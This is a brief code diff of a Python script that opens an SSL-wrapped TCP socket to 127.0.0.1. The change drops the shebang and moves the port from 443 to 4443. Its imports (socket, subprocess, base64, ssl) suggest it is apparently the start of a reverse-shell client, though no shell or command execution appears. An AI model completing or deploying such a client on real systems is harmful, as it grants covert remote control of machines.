@@ -1,8 +1,7 @@
-#!/usr/bin/env python
 import socket, subprocess, base64, ssl
 
 server = '127.0.0.1'
-port = 443
+port = 4443
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # wrap with ssl
